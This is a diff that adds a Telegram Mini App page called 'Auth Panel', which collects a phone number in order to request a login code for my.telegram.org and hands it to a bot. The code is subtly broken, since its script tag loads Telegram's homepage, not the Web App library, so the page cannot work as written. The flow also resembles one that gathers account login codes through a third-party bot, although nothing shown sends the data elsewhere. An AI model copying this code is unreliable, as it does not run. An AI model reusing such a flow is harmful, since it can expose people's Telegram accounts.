@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org"></script>
+    <style>
+        body { background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .card { background: var(--tg-theme-secondary-bg-color); padding: 20px; border-radius: 15px; width: 100%; max-width: 300px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 10px; border: 1px solid #555; background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #2481cc; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        button:active { transform: scale(0.98); opacity: 0.9; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="margin-top:0">🔑 Auth Panel</h2>
+        <p style="font-size: 14px; opacity: 0.8;">Введите номер для получения кода с my.telegram.org</p>
+        <input type="tel" id="phone" placeholder="+79001112233">
+        <button id="mainBtn">Запросить код</button>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.hide();
+
+        document.getElementById('mainBtn').onclick = function() {
+            let phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                tg.showAlert("Введите номер телефона!");
+                return;
+            }
+            // Отправка данных боту
+            tg.sendData(JSON.stringify({ "action": "get_site_code", "phone": phone }));
+            tg.close();
+        };
+    </script>
+</body>
+</html>
